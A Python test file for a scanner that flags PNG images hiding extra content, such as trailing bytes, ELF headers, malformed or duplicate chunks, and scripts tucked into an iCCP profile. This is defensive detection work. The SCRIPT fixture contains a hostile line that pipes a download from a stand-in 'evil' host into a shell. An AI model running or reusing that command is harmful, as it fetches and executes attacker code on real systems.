"""Failing-first regressions for re-audit v20: IDAT tail and exact chunk rules."""

import zlib

from review.scanners import plain
from image_fixtures import PNG_SIGNATURE, chunk, ihdr, png, png_with_idat, scanlines

SCRIPT = b"\nimport os; os.system('curl http://evil/x|sh')\n"
GOOD = {
    b"gAMA": b"\x00\x00\xb1\x8f",
    b"cHRM": b"\x00" * 32,
    b"sRGB": b"\x00",
    b"pHYs": b"\x00" * 8 + b"\x01",
    b"sBIT": b"\x08\x08\x08",
    b"bKGD": b"\x00" * 6,
    b"tRNS": b"\x00" * 6,
    b"PLTE": b"\x00" * 3,
}


def test_bytes_after_the_zlib_stream_need_person():
    raw = scanlines()
    for tail in (b"\x7fELF\x02\x01\x01\x00", SCRIPT, zlib.compress(raw)):
        data = png_with_idat(zlib.compress(raw) + tail)
        assert plain.assess_binary("docs/a.png", data) == (True, False), tail[:8]


def test_trailing_bytes_in_a_later_idat_chunk_need_person():
    raw = scanlines()
    data = png_with_idat(zlib.compress(raw))
    extra = chunk(b"IDAT", b"\x7fELF")
    forged = data.replace(chunk(b"IEND", b""), extra + chunk(b"IEND", b""))
    assert plain.assess_binary("docs/a.png", forged) == (True, False)


def test_each_allow_listed_chunk_accepts_its_valid_form():
    for kind, payload in GOOD.items():
        assert plain.assess_binary("a.png", png(extra=[chunk(kind, payload)])) == (False, True), kind


def test_duplicate_ancillary_chunks_need_person():
    for kind, payload in GOOD.items():
        data = png(extra=[chunk(kind, payload), chunk(kind, payload)])
        assert plain.assess_binary("a.png", data) == (True, False), kind


def test_duplicate_ihdr_needs_person():
    data = png()
    forged = PNG_SIGNATURE + chunk(b"IHDR", ihdr()) + data[len(PNG_SIGNATURE):]
    assert plain.assess_binary("a.png", forged) == (True, False)


def test_ihdr_must_be_first_and_13_bytes():
    not_first = PNG_SIGNATURE + chunk(b"gAMA", GOOD[b"gAMA"]) + png()[len(PNG_SIGNATURE):]
    assert plain.assess_binary("a.png", not_first) == (True, False)
    for size in (12, 14):
        data = png().replace(chunk(b"IHDR", ihdr()), chunk(b"IHDR", b"\x00" * size))
        assert plain.assess_binary("a.png", data) == (True, False), size


def test_iccp_is_no_longer_allowed():
    profile = b"icc\x00\x00" + zlib.compress(SCRIPT)
    assert plain.assess_binary("a.png", png(extra=[chunk(b"iCCP", profile)])) == (True, False)


def test_fixed_length_chunks_reject_wrong_lengths():
    for kind, payload in GOOD.items():
        if kind in (b"sBIT", b"bKGD", b"tRNS", b"PLTE"):
            continue
        for delta in (-1, 1):
            bad = payload[:len(payload) + delta] if delta < 0 else payload + b"\x00"
            data = png(extra=[chunk(kind, bad)])
            assert plain.assess_binary("a.png", data) == (True, False), (kind, delta)


def test_srgb_rendering_intent_range():
    for value in (0, 1, 2, 3):
        assert plain.assess_binary("a.png", png(extra=[chunk(b"sRGB", bytes([value]))])) == (False, True)
    for value in (4, 255):
        assert plain.assess_binary("a.png", png(extra=[chunk(b"sRGB", bytes([value]))])) == (True, False)


def test_phys_unit_must_be_zero_or_one():
    for unit in (0, 1):
        data = png(extra=[chunk(b"pHYs", b"\x00" * 8 + bytes([unit]))])
        assert plain.assess_binary("a.png", data) == (False, True)
    for unit in (2, 255):
        data = png(extra=[chunk(b"pHYs", b"\x00" * 8 + bytes([unit]))])
        assert plain.assess_binary("a.png", data) == (True, False)


def test_plte_rules():
    assert plain.assess_binary("a.png", png(extra=[chunk(b"PLTE", b"\x00" * 768)])) == (False, True)
    for bad in (b"\x00" * 5, b"\x00" * 771, b""):
        assert plain.assess_binary("a.png", png(extra=[chunk(b"PLTE", bad)])) == (True, False), len(bad)
    # colour type 0 (grayscale) forbids a palette
    data = png(extra=[chunk(b"PLTE", b"\x00" * 3)], colour=0)
    assert plain.assess_binary("a.png", data) == (True, False)
    assert plain.assess_binary("a.png", png(extra=[chunk(b"PLTE", b"\x00" * 3)], colour=3)) == (False, True)


def test_sbit_bkgd_trns_length_ranges():
    for size in (1, 2, 3, 4):
        assert plain.assess_binary("a.png", png(extra=[chunk(b"sBIT", b"\x08" * size)])) == (False, True)
    for size in (0, 5):
        assert plain.assess_binary("a.png", png(extra=[chunk(b"sBIT", b"\x08" * size)])) == (True, False)
    for size in (1, 2, 6):
        assert plain.assess_binary("a.png", png(extra=[chunk(b"bKGD", b"\x00" * size)])) == (False, True)
    for size in (3, 4, 5, 7):
        assert plain.assess_binary("a.png", png(extra=[chunk(b"bKGD", b"\x00" * size)])) == (True, False)
    assert plain.assess_binary("a.png", png(extra=[chunk(b"tRNS", b"\x00" * 256)])) == (False, True)
    assert plain.assess_binary("a.png", png(extra=[chunk(b"tRNS", b"\x00" * 257)])) == (True, False)


def test_repeated_idat_and_software_text_are_allowed():
    raw = scanlines()
    half = len(zlib.compress(raw))
    stream = zlib.compress(raw)
    split = png_with_idat(stream[:half]).replace(
        chunk(b"IEND", b""), chunk(b"IDAT", stream[half:]) + chunk(b"IEND", b""),
    )
    assert plain.assess_binary("a.png", split) == (False, True)
    tag = chunk(b"tEXt", b"Software\x00Matplotlib version3.11.1")
    assert plain.assess_binary("a.png", png(extra=[tag, tag])) == (False, True)


def test_achyudh_png_stays_plain_image():
    data = png(
        extra=[
            chunk(b"tEXt", b"Software\x00Matplotlib version3.11.1, https://matplotlib.org/"),
            chunk(b"pHYs", b"\x00\x00\x0b\x13\x00\x00\x0b\x13\x01"),
        ],
        width=8, height=4, colour=6,
    )
    assert plain.assess_binary("docs/benchmark_matrix_summary.png", data) == (False, True)
